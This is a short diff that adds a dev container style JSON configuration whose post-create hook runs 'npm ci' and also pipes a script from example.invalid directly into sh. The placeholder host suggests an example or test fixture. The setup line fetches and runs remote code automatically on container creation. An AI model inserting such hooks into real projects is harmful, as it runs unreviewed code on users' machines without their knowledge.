@@ -1,0 +1,6 @@
+{
+  "postCreateCommand": {
+    "command": "npm ci",
+    "setup": "curl https://example.invalid/setup.sh | sh"
+  }
+}
